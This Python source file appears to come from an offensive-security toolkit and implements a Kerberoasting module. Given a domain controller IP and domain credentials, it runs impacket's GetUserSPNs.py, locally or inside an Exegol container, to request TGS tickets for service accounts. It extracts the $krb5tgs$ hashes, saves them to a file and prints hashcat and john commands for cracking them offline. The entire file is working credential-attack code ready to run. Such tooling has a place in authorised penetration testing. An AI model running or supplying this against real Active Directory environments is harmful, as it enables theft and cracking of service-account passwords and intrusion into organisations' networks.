"""
Kerberoasting Module
Request TGS tickets for SPNs and crack offline
Supports execution via Exegol container or local tools
"""

import os
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class Kerberoast(ModuleBase):
    """
    Kerberoasting attack module
    Requests TGS tickets for service accounts with SPNs
    Automatically uses Exegol container if local tools not found
    """

    def __init__(self):
        super().__init__()
        self.name = "kerberoast"
        self.description = "Kerberoast attack - request TGS tickets for cracking"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "kerberos", "kerberoast", "spn", "credential", "attack"]
        self.references = [
            "https://attack.mitre.org/techniques/T1558/003/",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast"
        ]

        # Register options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Domain username", required=True)
        self.register_option("PASS", "Domain password", required=True)
        self.register_option("TARGET_USER", "Specific user to kerberoast (optional)", default="")
        self.register_option("OUTPUT", "Output file for hashes", default="kerberoast_hashes.txt")
        self.register_option("FORMAT", "Hash format: hashcat, john", default="hashcat",
                           choices=["hashcat", "john"])
        self.register_option("EXEGOL_CONTAINER", "Exegol container name (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        if target_user:
            self.print_status(f"Target User: {target_user}")
        self.print_line()

        # Build command
        cmd_parts = [
            "GetUserSPNs.py",
            f"'{domain}/{user}:{password}'",
            "-dc-ip", dc_ip,
            "-request",
        ]

        if target_user:
            cmd_parts.extend(["-request-user", target_user])

        cmd = " ".join(cmd_parts)

        # Try local first, fall back to Exegol
        tool_path = find_tool("GetUserSPNs.py")
        if tool_path:
            self.print_status("Using local impacket tools")
            ret, stdout, stderr = self.run_command(
                [tool_path, f"{domain}/{user}:{password}", "-dc-ip", dc_ip, "-request"] +
                (["-request-user", target_user] if target_user else []),
                timeout=120
            )
        else:
            self.print_status("Using Exegol container for impacket tools")
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)

        # Process output
        output_text = stdout + stderr
        hashes_found = []

        for line in output_text.split('\n'):
            if line.strip():
                if '$krb5tgs$' in line:
                    hashes_found.append(line.strip())
                    self.print_good(f"Got TGS hash!")
                elif 'ServicePrincipalName' in line or '---' in line:
                    self.print_line(line)
                elif line.strip().startswith(('-', '[')):
                    if '[-]' in line:
                        self.print_error(line)
                    elif '[+]' in line:
                        self.print_good(line)
                    elif '[*]' in line:
                        self.print_status(line.replace('[*]', '').strip())
                else:
                    # SPN table rows
                    if '  ' in line and not line.startswith('Impacket'):
                        self.print_line(line)

        # Save hashes
        if hashes_found:
            try:
                output_path = os.path.abspath(output)
                with open(output_path, 'w') as f:
                    f.write('\n'.join(hashes_found))
                self.print_good(f"Saved {len(hashes_found)} hash(es) to: {output_path}")
                self.print_status(f"Crack with: hashcat -m 13100 {output} wordlist.txt")
                self.print_status(f"        or: john --format=krb5tgs {output} --wordlist=wordlist.txt")
            except Exception as e:
                self.print_warning(f"Could not save to file: {e}")
                self.print_line()
                self.print_status("Hashes:")
                for h in hashes_found:
                    self.print_line(h)

            return True
        else:
            self.print_warning("No kerberoastable users found or no hashes retrieved")
            return False

    def check(self) -> bool:
        """Check if tools are available locally or via Exegol"""
        if find_tool("GetUserSPNs.py"):
            return True
        # Check Exegol
        ret, stdout, stderr = self.run_in_exegol("which GetUserSPNs.py", timeout=10)
        return ret == 0
